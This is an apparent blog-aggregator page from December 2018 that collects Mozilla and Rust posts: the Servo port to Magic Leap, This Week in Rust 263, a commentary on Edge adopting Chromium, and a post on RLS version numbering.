<p><img alt="Magic Leap Servo" src="magicleap-servo.jpg" title="Magic Leap Servo" /></p>

<p>This is a developer preview release, designed for as a testbed for future products,
and as a venue for experimenting with UI design. What should the web look like in augmented
reality? We hope to use Servo to find out!</p>

<p>We are providing these nightly snapshots to encourage other developers to experiment with
AR web experiences. There are still many missing features, such as immersive or 3D content,
many types of user input, media, or a stable embedding API. We hope you forgive the rough edges.</p>

<p>This blog post will describe the experience of porting Servo to a new architecture,
and is intended for system developers.</p>

<h3>Magic Leap under the hood</h3>

<p>The Magic Leap software development kit (SDK) is based on commonly-used open-source
technologies. In particular, it uses the clang compiler and the gcc toolchain
for support tools such as <code class="highlighter-rouge">ld</code>, <code class="highlighter-rouge">objcopy</code>, <code class="highlighter-rouge">ranlib</code> and friends.</p>

<p>The architecture is 64-bit ARM, using the same application binary interface as Android.
Together these give the target as being <code class="highlighter-rouge">aarch64-linux-android</code>, the same as for many
64-bit Android devices. Unlike Android, Magic Leap applications are
native programs, and do not require a Java Native Interface (JNI) to the OS.</p>

<p>Magic Leap provides a lot of support for developing AR applications, in the form of
the Lumin Runtime APIs, which include 3D scene descriptions, UI elements, input events
including device placement and orientation in 3D space, and rendering to displays
which provide users with 3D virtual visual and audio environments that interact with
the world around them.</p>

<p>The Magic Leap and Lumin Runtime SDKs are available from
<a href="https://creator.magicleap.com/">https://creator.magicleap.com/</a> for Mac and Windows platforms.</p>

<h3>Building the Servo library</h3>

<p>The Magic Leap library is built using <code class="highlighter-rouge">./mach build --magicleap</code>,
which under the hood calls <code class="highlighter-rouge">cargo build
--target=aarch64-linux-android</code>. For most of the Servo library and its
dependencies, this just works, but there are a couple of corner cases:
C/C++ libraries and crates with special treatment for Android.</p>

<p>Some of Servo‚Äôs dependencies are crates which link against C/C++
libraries, notably <code class="highlighter-rouge">openssl-sys</code> and <code class="highlighter-rouge">mozjs-sys</code>. Each of these
libraries uses slightly different build environments (such as Make,
CMake or Autoconf, often with custom build scripts). The challenge for
software like Servo that uses many such libraries is to find a
configuration which will work for all the dependencies. This comes
down to finding the right settings for environment variables such as
<code class="highlighter-rouge">$CFLAGS</code>, and is complicated by cross-compiling the libraries which
often means ensuring that the Magic Leap libraries are included, not
the host libraries.</p>

<p>The other main source of issues with the build is that since Magic
Leap uses the same ABI as Android, its target is
<code class="highlighter-rouge">aarch64-linux-android</code>, which is the same as for 64-bit ARM Android
devices. As a result, many crates which need special treatment for
Android (for example for JNI or to use <code class="highlighter-rouge">libandroid</code>) will treat the
Magic Leap build as an Android build rather than a Linux build. Some
care is needed to undo all of this special treatment. For example,
the build scripts of Servo, SpiderMonkey and OpenSSL all contain code
to guess the directory layout of the Android SDK, which needs to be
undone when building for Magic Leap.</p>

<p><img alt="Debugging in vscode" src="magicleap-vscode.png" title="Debugging in vscode" /></p>

<p>One thing that just worked turned out to be debugging Rust code on the
Magic Leap device. Magic Leap supports the Visual Studio Code IDE, and
remote debugging of code running natively. It was great to see the
debugging working out of the box for Rust code as well as it did for C++.</p>

<h3>Building the Magic Leap application</h3>

<p>The first release of Servo for Magic Leap comes with a rudimentary
application for browsing 2D web content. This is missing many
features, such as immersive 3D content, audio or video media, or user
input by anything other than the controller.</p>

<p>Magic Leap applications come in two flavors: universe applications,
which are immersive experiences that have complete control over the
device, and landscape applications, which co-exist and present the
user with a blended experience where each application presents part of
a virtual scene. Currently, Servo is a landscape application, though
we expect to add a universe application for immersive web content.</p>

<p>Landscape applications can be designed using the Lumin Runtime Editor,
which gives a visual presentation of the various UI components in the
scene graph.</p>

<p><img alt="Lumin Runtime Editor" src="magicleap-lre.png" title="Lumin Runtime Editor" /></p>

<p>The most important object in Servo‚Äôs scene graph is the <code class="highlighter-rouge">content</code>
node, since it is a <code class="highlighter-rouge">Quad</code> that can contain a 2D resource. One of the
kinds of resource that a <code class="highlighter-rouge">Quad</code> can contain is an EGL context, that
Servo uses to render web content. The runtime editor generates C++
code that can be included in an application to render and access the
scene graph; Servo uses this to access the content node, and the EGL
context it contains.</p>

<p>The other hooks that the Magic Leap Servo application uses are for
events such as moving the laser pointer, which are mapped to mouse
events, a heartbeat for animations or other effects which must be
performed on the main thread, and a logger which bridges Rust‚Äôs logging
API to Lumin‚Äôs.</p>

<p>The Magic Leap application is built each night by Servo‚Äôs CI system,
using the Mac builders since there is no Linux SDK for Magic
Leap. This builds the Servo library, and packages it is a Magic Leap
application, which is hosted on S3 and linked to from the Servo
download page.</p>

<h3>Summary</h3>

<p>The pull request that added Magic Leap support to Servo is
<a href="https://github.com/servo/servo/pull/21985">https://github.com/servo/servo/pull/21985</a>
which adds about 1600 lines to Servo, mostly in the build scripts and
the Magic Leap application. Work on the Magic Leap port of Servo started
in early September 2018, and the pull request was merged at the end of October,
so took about two person-months.</p>

<p>Much of the port was straightforward, due to the maturity of the Rust
cross-compilation and build tools, and the use of common open-source
technologies in the Magic Leap platform. Lumin OS contains many
innovative features in its treatment of blending physical and virtual
3D environments, but it is built on a solid open-source foundation,
which makes porting a complex application like Servo relatively
straightforward.</p>

<p>Servo is now making its first steps onto the Magic Leap One, and is
available for download and experimentation. Come try it out, and help
us design the immersive web!</p></div></div><div class="permalink"><a href="https://blog.servo.org/2018/12/04/magicleap/">by The Servo Blog at <time datetime="2018-12-04T15:00:00Z" title="December 04, 2018 03:00 PM GMT">‰∏ãÂçà11:00:00</time></a></div></div><div class="news this-week-in-rust"><a id="news-48"></a><h3><a href="https://this-week-in-rust.org/" title="This Week in Rust">This Week In Rust</a> ‚Äî <a href="https://this-week-in-rust.org/blog/2018/12/04/this-week-in-rust-263/">This Week in Rust 263</a></h3><div class="entry"><div class="content"><p>Hello and welcome to another issue of <em>This Week in Rust</em>!
<a href="http://rust-lang.org/">Rust</a> is a systems language pursuing the trifecta: safety, concurrency, and speed.
This is a weekly summary of its progress and community.
Want something mentioned? Tweet us at <a href="https://twitter.com/ThisWeekInRust">@ThisWeekInRust</a> or <a href="https://github.com/cmr/this-week-in-rust">send us a pull request</a>.
Want to get involved? <a href="https://github.com/rust-lang/rust/blob/master/CONTRIBUTING.md">We love contributions</a>.</p>
<p><em>This Week in Rust</em> is openly developed <a href="https://github.com/cmr/this-week-in-rust">on GitHub</a>.
If you find any errors in this week's issue, <a href="https://github.com/cmr/this-week-in-rust/pulls">please submit a PR</a>.</p>
<h3>Updates from Rust Community</h3>
<h4>News &amp; Blog Posts</h4>
<ul>
<li><a href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html">A new look for rust-lang.org</a>.</li>
<li><a href="https://dtolnay.github.io/rust-quiz/18">Rust Quiz: 26 medium to hard Rust questions with complete explanations</a>.</li>
<li><a href="https://bheisler.github.io/post/announcing-rustacuda/">Announcing RustaCUDA</a>.</li>
<li><a href="https://aws.amazon.com/blogs/opensource/rust-runtime-for-aws-lambda/">Official Rust runtime for AWS Lambda</a>.</li>
<li><a href="https://medium.com/@kkostov/rust-aws-lambda-30a1b92d4009">Creating my first AWS Lambda using Rust</a>.</li>
<li><a href="https://hsivonen.fi/modern-cpp-in-rust/">How I wrote a modern C++ library in Rust</a>.</li>
<li><a href="https://www.phusionpassenger.com/docs/advanced_guides/gls/rust.html">Using Passenger with Rust</a>.</li>
<li><a href="http://fitzgeraldnick.com/2018/12/02/wasm-bindgen-how-does-it-work.html">wasm-bindgen ‚Äî how does it work</a>?</li>
<li><a href="https://rust-lang-nursery.github.io/wg-net/2018/11/28/wg-net-survey.html">Rust web survey 2018</a>.</li>
<li><a href="https://rustwasm.github.io/2018/11/28/this-week-in-rust-wasm-009.html">This Week in Rust and WebAssembly 9</a>.</li>
</ul>
<h3>Crate of the Week</h3>
<p>This week's crate is <a href="https://github.com/japaric/cargo-call-stack">cargo-call-stack</a>, a cargo subcommand for whole-program call stack analysis. Thanks to <a href="https://mobile.twitter.com/japaricious/status/1069569802241486850">Jorge Aparicio</a> for the suggestion!</p>
<p><a href="https://users.rust-lang.org/t/crate-of-the-week/2704">Submit your suggestions and votes for next week</a>!</p>
<h3>Call for Participation</h3>
<p>Always wanted to contribute to open-source projects but didn't know where to start?
Every week we highlight some tasks from the Rust community for you to pick and get started!</p>
<p>Some of these tasks may also have mentors available, visit the task page for more information.</p>
<ul>
<li><a href="https://cfp.rustlatam.org/events/rust-latam">Rust Latam CFP is now open, deadline is December 31st</a>.</li>
<li><a href="https://imag-pim.org/blog/2018/12/04/call-for-participation-2/">The imag project calls for contributors (2)</a></li>
</ul>
<p>If you are a Rust project owner and are looking for contributors, please submit tasks <a href="https://users.rust-lang.org/t/twir-call-for-participation/4821">here</a>.</p>
<h3>Updates from Rust Core</h3>
<p>254 pull requests were <a href="https://github.com/search?q=is%3Apr+org%3Arust-lang+is%3Amerged+merged%3A2018-11-26..2018-12-03">merged in the last week</a></p>
<ul>
<li><a href="https://github.com/rust-lang/rust/pull/49219">decouple proc_macro from the rest of the compiler</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56214">implement chalk unification routines</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55835">upgrade LLVM to trunk, still version 8</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56313">another LLVM Update</a> and <a href="https://github.com/rust-lang/rust/pull/56298">Re-enable lldb</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55821">use sort_by_cached_key when the key function is not trivial/free</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56312">deduplicate literal ‚Üí constant lowering</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56275">use <code>MaybeUninit</code> instead of <code>mem::uninitialized</code> for Windows Mutex</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/49878">libcore: add VaList and variadic arg handling intrinsics</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56378">arena: speed up TypedArena::clear and improve common patterns</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56245">stabilize <code>macro_at_most_once_rep</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56395">stabilize <code>dbg!(..)</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56366">stabilize <code>self_in_typedefs</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56365">stabilize <code>self_struct_ctor</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56236">remove unsafe <code>unsafe</code> inner function</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56216">add <code>TryFrom&lt;&amp;[T]&gt; for [T; $N] where T: Copy</code></a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56401">move VecDeque::resize_with out of the impl block</a></li>
<li><a href="https://github.com/rust-lang/cargo/pull/6280">use allow-dirty option in <code>cargo package</code> to skip vcs checks</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55705">make <code>ParseIntError</code> and <code>IntErrorKind</code> fully public</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/54668">use MaybeUninit in libcore</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/56319">fix futures creating aliasing mutable and shared ref</a></li>
<li><a href="https://github.com/rust-lang/rust/pull/55011">add libstd Cargo feature <code>panic_immediate_abort</code></a></li>
<li><a href="https://github.com/rust-lang/cargo/pull/6366">cargo: ConflictStoreTrie: faster filtered search</a></li>
<li><a href="https://github.com/rust-lang/crates.io/pull/1565">crates.io: email verification warning</a></li>
</ul>
<h4>Approved RFCs</h4>
<p>Changes to Rust follow the Rust <a href="https://github.com/rust-lang/rfcs#rust-rfcs">RFC (request for comments)
process</a>. These
are the RFCs that were approved for implementation this week:</p>
<ul>
<li><a href="https://github.com/rust-lang/rfcs/pull/2591">RFC 2591: Stabilise exhaustive integer pattern matching</a>.</li>
<li><a href="https://github.com/rust-lang/rfcs/pull/2500">RFC 2500: Needle API (n√©e Pattern API)</a>.</li>
</ul>
<h4>Final Comment Period</h4>
<p>Every week <a href="https://www.rust-lang.org/team.html">the team</a> announces the
'final comment period' for RFCs and key PRs which are reaching a
decision. Express your opinions now.</p>
<h5><a href="https://github.com/rust-lang/rfcs/labels/final-comment-period">RFCs</a></h5>
<p><em>No RFCs are currently in final comment period.</em></p>
<h5><a href="https://github.com/rust-lang/rust/labels/final-comment-period">Tracking Issues &amp; PRs</a></h5>
<ul>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/56292">Stabilize memory-releated <code>std::arch::wasm32</code> intrinsics</a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/49303">Tracking issue for RFC 2300, "<code>Self</code> in type definitions"</a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/48656">Tracking issue for str::split_ascii_whitespace</a>.</li>
<li>[disposition: merge] <a href="https://github.com/rust-lang/rust/issues/41758">Tracking issue for Vec::resize_with and resize_default</a>.</li>
<li>[disposition: close] <a href="https://github.com/rust-lang/rust/issues/55600">Tracking issue for feature <code>extern_in_paths</code></a>.</li>
</ul>
<h4>New RFCs</h4>
<ul>
<li><a href="https://github.com/rust-lang/rfcs/pull/2604">impl trait expressions</a>.</li>
</ul>
<h3>Upcoming Events</h3>
<h5>Online</h5>
<ul>
<li><a href="https://discordapp.com/channels/442252698964721669/443773747350994945">Dec 12. Rust Community Team Meeting in Discord</a>.</li>
<li><a href="https://discordapp.com/channels/442252698964721669/443773747350994945">Dec 17. Rust Community Content Subteam Meeting on Discord</a>.</li>
<li><a href="https://t.me/joinchat/EkKINhHCgZ9llzvPidOssA">Dec 19. Rust Events Team Meeting on Telegram</a>.</li>
</ul>
<h5>Asia Pacific</h5>
<ul>
<li><a href="https://reps.mozilla.org/e/rust-community-meetup-pune/">Dec  6. Pune, IN - Rust workshop at Pune, India</a>.</li>
<li><a href="https://www.meetup.com/Rust-Hangzhou/events/256338781/">Dec 12. Hangzhou, CN - Rust Hangzhou</a>.</li>
<li><a href="https://www.meetup.com/Rust-Sydney/events/256668602/">Dec 16. Sydney, AU - Rust Sydney Meetup 15</a>.</li>
</ul>
<h5>Europe</h5>
<ul>
<li><a href="https://metalab.at/wiki/Rust-Workshop">Dec 10. Vienna, AT - Metalab - Rust Workshop</a>.</li>
<li><a href="https://www.meetup.com/Rust-Zurich/events/255279763/">Dec 11. Zurich, CH - Rust Zurich - Rust Embedded Edition 2018</a>.</li>
<li><a href="https://www.meetup.com/opentechschool-berlin/events/rjgkhqyxqbqb/">Dec 12. Berlin, DE - Berlin Rust Hack and Learn</a>.</li>
<li><a href="https://www.meetup.com/rust-language-milano/events/256948632/">Dec 12. Milano, IT - Milano - Hello Open Closed Principle</a>.</li>
<li><a href="https://rustrush.ru/">Dec 15 &amp; 16. Moscow, RU - RustRush 2018</a>.</li>
<li><a href="https://www.meetup.com/Cambridge-Rust-Meetup/events/pzwshpyxqbbc/">Dec 20. Cambridge, GB - The Last Cambridge Rust</a>?</li>
<li><a href="https://www.meetup.com/Mozilla-Torino/events/sbtclqyxqbkc/">Dec 20. Turin, IT - Gruppo di studio Rust</a>.</li>
</ul>
<h5>North America</h5>
<ul>
<li><a href="https://www.meetup.com/Desert-Rustaceans/events/256503618">Dec  6. Phoenix, US - Phoenix 2018 Edition Release Party</a>.</li>
<li><a href="https://www.meetup.com/Rust-Dev-in-Mountain-View/events/glnfcpyxqbmb/">Dec  9. Mountain View, US - Rust Dev in Mountain View!</a>.</li>
<li><a href="https://www.meetup.com/Seattle-Rust-Meetup/events/pkggvpyxqbnb/">Dec 10. Seattle, US - Seattle Rust Meetup</a>.</li>
<li><a href="https://www.meetup.com/Vancouver-Rust/events/rzszlqyxqbqb/">Dec 12. Vancouver, CA - Vancouver Rust meetup</a>.</li>
<li><a href="https://www.meetup.com/Rust-Boulder-Denver/events/256949931/">Dec 12. Boulder, US - Rust Boulder/Denver Monthly Meeting</a>.</li>
<li><a href="https://www.meetup.com/RustDC/events/256181658">Dec 13. Arlington, US - Rust DC ‚Äî Mid-month Rustful</a>.</li>
<li><a href="https://www.meetup.com/columbus-rs/events/dbcfrpyxqbrb/">Dec 13. Columbus, US - Columbus Rust Society - Monthly Meeting</a>.</li>
<li><a href="https://www.meetup.com/utahrust/events/255209738/">Dec 13. Utah, US - Utah Rust monthly meetup</a>.</li>
<li><a href="https://www.meetup.com/San-Diego-Rust/events/256264465/">Dec 13. San Diego, US - San Diego Rust December Meetup - Rust 2018 Overview + Memory Allocator</a>.</li>
<li><a href="https://www.meetup.com/Rust-Dev-in-Mountain-View/events/glnfcpyxqbvb/">Dec 16. Mountain View, US - Rust Dev in Mountain View!</a>.</li>
<li><a href="https://www.meetup.com/Chicago-Rust-Meetup/events/256778181">Dec 20. Chicago, US - Rust for the Holidays</a>.</li>
</ul>
<p>If you are running a Rust event please add it to the <a href="https://www.google.com/calendar/embed?src=apd9vmbc22egenmtu5l6c5jbfc%40group.calendar.google.com">calendar</a> to get
it mentioned here. Please remember to add a link to the event too.
Email the <a href="mailto:community-team@rust-lang.org">Rust Community Team</a> for access.</p>
<h3>Rust Jobs</h3>
<ul>
<li><a href="https://careers-blueorigin.icims.com/jobs/3247/software-infrastructure-engineer---engines/job">Software Infrastructure Engineer - Engines at Blue Origin, Kent, US</a>.</li>
<li><a href="https://www.commure.com/#jobSection">Rust Engineer at Commure, Inc. (San Francisco, Boston, Montreal)</a>.</li>
<li><a href="https://angel.co/finhaven/jobs/411238-intermediate-software-developer">Intermediate Software Developer at Finhaven, Vancouver, CA</a>.</li>
<li><a href="https://twitter.com/nonparibus/status/1067893414765764614">Tech Lead at Hashintel, London, GB</a>.</li>
<li><a href="https://www.pse.kit.edu/karriere/joboffer.php?id=2093&amp;language=en">Embedded operating system developer, Karlsruhe, DE</a></li>
<li><a href="https://twitter.com/oli_obk/status/1064856324071178240">Student research assistant (embedded), Karlsruhe, DE</a></li>
</ul>
<p><em>Tweet us at <a href="https://twitter.com/ThisWeekInRust">@ThisWeekInRust</a> to get your job offers listed here!</em></p>
<h3>Quote of the Week</h3>
<blockquote>
<p>The bug I did not have</p>
</blockquote>
<p>‚Äì /u/pacman82's <a href="https://www.reddit.com/r/rust/comments/a1w75c/the_bug_i_did_not_have/">reddit post</a> title</p>
<p>Thanks to <a href="https://users.rust-lang.org/t/twir-quote-of-the-week/328/582">Felix</a> for the suggestion!</p>
<p><a href="http://users.rust-lang.org/t/twir-quote-of-the-week/328">Please submit your quotes for next week</a>!</p>
<p><em>This Week in Rust is edited by: <a href="https://github.com/nasa42">nasa42</a>, <a href="https://github.com/llogiq">llogiq</a>, and <a href="https://github.com/Flavsditz">Flavsditz</a>.</em></p>
<p><small><a href="https://www.reddit.com/r/rust/comments/a3et38/this_week_in_rust_263/">Discuss on r/rust</a>.</small></p></div></div><div class="permalink"><a href="https://this-week-in-rust.org/blog/2018/12/04/this-week-in-rust-263/">by TWiR Contributors at <time datetime="2018-12-04T05:00:00Z" title="December 04, 2018 05:00 AM GMT">‰∏ãÂçà1:00:00</time></a></div></div><div class="news cameron-kaiser"><a id="news-49"></a><h3><a href="http://tenfourfox.blogspot.com/" title="TenFourFox Development">Cameron Kaiser</a> ‚Äî <a href="http://tenfourfox.blogspot.com/2018/12/edge-gets-chrome-plated-and-were-all.html">Edge gets Chrome-plated, and we're all worse off</a></h3><div class="entry"><div class="content">I used to think that <a href="http://tenfourfox.blogspot.com/2013/02/opera-knows-power-of-dark-side-of.html">WebKit would eat the world</a>, but later on <a href="http://tenfourfox.blogspot.com/2013/04/blink-theres-new-html-rendering-engine.html">I realized it was Blink</a>. In retrospect this should have been obvious when <a href="http://tenfourfox.blogspot.com/2017/10/various-and-sundry-overbitewx-is-coming.html">the mobile version of Microsoft Edge was announced to use Chromium</a> (and not Microsoft's own rendering engine EdgeHTML), but now rumour has it that Edge on its own home turf -- Windows 10 -- <a href="https://www.windowscentral.com/microsoft-building-chromium-powered-web-browser-windows-10">will be Chromium too</a>. Microsoft engineers have already been spotted committing to the Chromium codebase, <a href="https://9to5google.com/2018/11/19/microsoft-google-chrome-windows-10-arm/">apparently for the ARM version</a>. No word on whether this next browser, codenamed Anaheim, will still be called Edge. <p>In the sense that Anaheim won't (at least in name) be Google, just Chromium, there's reason to believe that it won't have <a href="https://blog.cryptographyengineering.com/2018/09/23/why-im-leaving-chrome/">the repeated privacy erosions</a> that have characterized Google's recent moves with Chrome itself. But given how much DNA WebKit and Blink share, that means there are effectively two current major rendering engines left: Chromium and Gecko (Firefox). The little ones like <a href="https://www.netsurf-browser.org/">NetSurf</a>, bless its heart, don't have enough marketshare (or currently features) to rate, Trident in Internet Explorer 11 is intentionally obsolete, and the rest are too deficient to be anywhere near usable (Dillo, etc.). So this means Chromium arrogates more browsershare to itself and Firefox will continue to be the <a href="https://www.neowin.net/news/mozilla-executive-claims-that-google-has-made-youtube-slower-on-edge-and-firefox">second class citizen</a> until it, too, has too small a marketshare to be relevant. Then Google has eaten the Web. And we are worse off for it. </p><p>Bet Mozilla's <a href="http://chrislord.net/2016/03/08/state-of-embedding-in-gecko/">reconsidering</a> that <a href="https://groups.google.com/forum/#!topic/mozilla.dev.planning/UGNqPY2YYNY">stupid embedding decision</a> now.</p></div></div><div class="permalink"><a href="http://tenfourfox.blogspot.com/2018/12/edge-gets-chrome-plated-and-were-all.html">by ClassicHasClass at <time datetime="2018-12-04T04:31:08Z" title="December 04, 2018 04:31 AM GMT">‰∏ãÂçà12:31:08</time></a></div></div><div class="news nick-cameron"><a id="news-50"></a><h3><a href="http://www.ncameron.org/blog/" title="featherweight musings">Nick Cameron</a> ‚Äî <a href="http://www.ncameron.org/blog/more-on-rls-version-numbering/">More on RLS version numbering</a></h3><div class="entry"><div class="content"><div class="kg-card-markdown"><p>In a few days the 2018 edition is going to roll out, and that will include some new framing around Rust's tooling. We've got a core set of developer tools which are stable and ready for widespread use. We're going to have a blog post all about that, but for now I wanted to address the status of the RLS, since when I last blogged about a 1.0 pre-release there was a significant sentiment that it was not ready (and given the expectations that a lot of people have, we agree).</p>
<p>The RLS has been in 0.x-stage development. We think it has reached a certain level of stability and usefulness. While it is not at the level of quality you might expect from a mature IDE, it is likely to be useful for a majority of users.</p>
<p>The RLS is tightly coupled with the compiler, and as far as backwards compatibility is concerned, that is the important thing. So from the next release, the RLS will share a version number with the Rust distribution. We are not claiming this as a '1.0' release, work is certainly not finished, but we think it is worth taking the opportunity of the 2018 edition to highlight the RLS as a usable and useful tool.</p>
<p>In the rest of this blog post I'll go over how the RLS works in order to give you an idea of what works well and what does not, and where we are going (or might go) in the future.</p>
<h3>Background</h3>
<p>The RLS is a language server for Rust - it is meant to handle the 'language knowledge' part of an IDE (c.f., editing, user interaction, etc.). The concept is that rather than having to develop Rust support from scratch in each editor or IDE, you can do it once in the language server and each editor can be a client. This is a recent approach to IDE development, in contrast to the approach of IntelliJ, Eclipse, and others, where the IDE is designed to make language support pluggable, but language support is closely tied to a specific IDE framework.</p>
<p>The RLS integrates with the Rust compiler, Cargo, and Racer to provide data. Cargo is used as a source of data for orchestrating builds. The compiler provides data for connecting references to definitions, and about types and docs (which is used for 'go to def', 'find all references', 'show type', etc.). Racer is used for code completion (and also to supply some docs). Racer can be thought of as a mini compiler which does as little as possible to provide code completion information as fast as possible.</p>
<p>The traditional approach to IDEs, and how Rust support in IntelliJ works, is to build a completely new compiler frontend, optimised for speed and incremental compilation. This compiler provides enough information to provide the IDE functionality, but usually doesn't do any code generation. This approach is much easier in fairly simple languages like Java, compared to Rust (macros, modules, and the trait system all make this a lot more complex).</p>
<p>There are trade-offs to the two approaches: using a separate compiler is fast and functionality can be limited to ensure it is fast enough. However, there is a risk that the two compilers do not agree on how to compiler a program, in particular, covering the whole of a language like Rust is difficult and so completeness can be an issue. Maintaining a separate compiler also takes a lot of work.</p>
<p>In the future, we hope to further optimise the Rust compiler for IDE cases so that it is fast enough that the user never has to wait, and to use the compiler for code completion. We also want to work with Cargo a bit differently so that there is less duplication of logic between Cargo and the RLS.</p>
<h3>Current status</h3>
<p>For each feature of the RLS, I measure its success along two axes: is it fast enough and is it complete (that is, does it work for all code). There are also non-functional issues of resource usage (how much battery and CPU the RLS is using), how often the RLS crashes, etc.</p>
<h4>Go to definition</h4>
<p>This is usually fast enough: if the RLS is ready, then it is pretty much instant. For large crates, it can take too long for the RLS to be ready, and thus we are not fast enough. However, usually using slightly stale data for 'go to def' is not a problem, so we're ok.</p>
<p>It is fairly complete. There are some issues around macros - if a definition is created by a macro, then we often have trouble. 'Go to def' is not implemented for lifetimes, and there are some places we don't have coverage (inside <code>where</code> clauses was recently fixed).</p>
<h4>Show type</h4>
<p>Showing types and documentation on hover has almost the same characteristics as 'go to definition'.</p>
<h4>Rename</h4>
<p>Renaming is similar to 'find all references' (and 'go to def'), but since we are modifying the user's code, there are some more things that can go wrong, and we want to be extra conservative. It is therefore a bit less complete than 'go to def', but similarly fast.</p>
<h4>Code completion</h4>
<p>Code completion is generally pretty fast, but often incomplete. This is because method dispatch in Rust is <em>really complicated</em>! Eventually, we hope that using the compiler for code completion rather than Racer will solve this problem.</p>
<h4>Resource usage</h4>
<p>The RLS is typically pretty heavy on the CPU. That is because we prioritise having results quickly over minimising CPU usage. In the future, making the compiler more incremental should give big improvements here.</p>
<h4>Crashes</h4>
<p>The RLS usually only crashes when it disagrees with Cargo about how to build a project, or when it exercises a code path in the compiler which would not be used by a normal compile, and that code path has a bug. While crashes are more common than I'd like, they're a lot rarer than they used to be, and should not affect most users.</p>
<h4>Project structure</h4>
<p>There is a remarkable variety in the way a Rust project can be structured. Multiple crates can be arranged in many ways (using workspaces, or not), build scripts and procedural macros cause compile-time code execution, and there are Cargo features, different platforms, tests, examples, etc. This all interacts with code which is edited but not yet saved. Every different configuration can cause bugs.</p>
<p>I think we are mostly doing well here, as far as I know there are no project structures to avoid (but this has been a big source of trouble in the past).</p>
<h4>Overall</h4>
<p>The RLS is clearly not done. It's not in the same league as IDE support for more mature languages. However, I think that it is at a stage where it is worth trying for many users. Stability is good enough - it's unlikely you'll have a bad experience. It does somewhat depend on how you use an IDE: if you rely heavily on code completion (in particular, if you use code completion as a learning tool), then the RLS is probably not ready. However, we think we should encourage new users to Rust to try it out.</p>
<p>So, while I agree that the RLS is not 'done', neither is it badly unstable, likely to be disappear, or lacking in basic functionality. For better or worse, 1.0 releases seem to have special significance in the Rust community. I hope the version numbering decision sends the right message: we're ready for all Rust users to use the RLS, but we haven't reached 'mission accomplished' (well, maybe in a 'George W Bush' way).</p>
<h3>More on that version number</h3>
<p>The RLS will follow the Rust compiler's version number, i.e., the next release will be 1.31.0. From a strict semver point of view this makes sense since the RLS is only compatible with its corresponding Rust version, so incrementing the minor version with each Rust release is the right thing to do. By starting at 1.31, we're deliberately avoiding the 1.0 label.</p>
<p>In terms of readiness, it's important to note that the RLS is not a user-facing piece of software. I believe the 1.x version number is appropriate in that context - if you want to build an IDE, then the RLS is stable enough to use as a library. However, it is lacking some user-facing completeness and so an IDE built using the RLS should probably not use the 1.0 number (our VSCode extension will keep using 0.x).</p>
<h3>The future</h3>
<p>There's been some discussion about how best to improve the IDE experience in Rust. I believe the language server approach is the correct one, but there are several options to make progress: continue making incremental improvements to the compiler and RLS, moving towards compiler-driven code completion; use an alternate compiler frontend (such as <a href="https://github.com/rust-analyzer/rust-analyzer">Rust analyzer</a>); improve Racer and continue to rely on it for code completion; some hybrid approach using more than one of these ideas.</p>
<p>When assessing these options, we need to take into account the likely outcome, the risk of something bad happening, the amount of work needed, and the long-term maintenance burden. The main downside of the current path is the risk that the compiler will never get fast enough to support usable code completion. Implementation is also a lot of work, however, it would mostly help with compile time issues in general. With the other approaches there is a risk that we won't get the completeness needed for useful code completion. The implementation work is again significant, and depending on how things pan out, there is a risk of much costlier long-term maintenance.</p>
<p>I've been pondering the idea of a hybrid approach: using the compiler to provide information about definitions (and naming scopes), and either Racer or Rust Analyzer to do the 'last mile' work of turning that into code completion suggestions (and possibly resolving references too). That might mean getting the best of both worlds - the compiler can deal with a lot of complexity where speed is not as necessary, and the other tools get a helping hand with the stuff that has to be done quickly.</p>
<p>Orthogonally, there is also work planned to better integrate with Cargo and to support more features, as well as some 'technical debt' issues, such as better testing.</p>
</div></div></div><div class="permalink"><a href="http://www.ncameron.org/blog/more-on-rls-version-numbering/">by Nick Cameron at <time datetime="2018-12-04T03:00:20Z" title="December 04, 2018 03:00 AM GMT">‰∏äÂçà11:00:20</time></a></div></div><div class="news mozilla-vr-blog"><a id="news-51"></a><h3><a href="https://blog.mozvr.com/" title="Mozilla Mixed Reality Blog">Mozilla VR Blog</a> ‚Äî <a href="https://blog.mozvr.com/a-new-browser-for-magic-leap/">A new browser for Magic Leap</a></h3><div class="entry"><div class="content"><div class="kg-card-markdown"><img alt="A new browser for Magic Leap" src="vlcsnap-2018-12-01-11h44m53s168.png" /><p>Today, <a href="https://download.servo.org/">we‚Äôre making available</a> an early developer preview of a browser for the <a href="https://www.magicleap.com/magic-leap-one">Magic Leap One</a> device. This browser is built on top of our Servo engine technology and shows off high quality 2D graphics and font rendering through our <a href="https://github.com/servo/webrender">WebRender</a> web rendering library, and more new features will soon follow.</p>

<p>While we only support basic 2D pages today and have not yet built the full Firefox Reality browser experience and published this into the Magic Leap store, we look forward to working alongside our partners and community to do that early in 2019! Please try out the builds, provide feedback, and <a href="https://starters.servo.org/">get involved</a> if you‚Äôre interested in the future of mixed reality on the web in a cutting-edge standalone headset. And for those looking at Magic Leap for the first time, we also have <a href="https://blog.servo.org/2018/12/04/magicleap">an article</a> on how the work was done.</p>
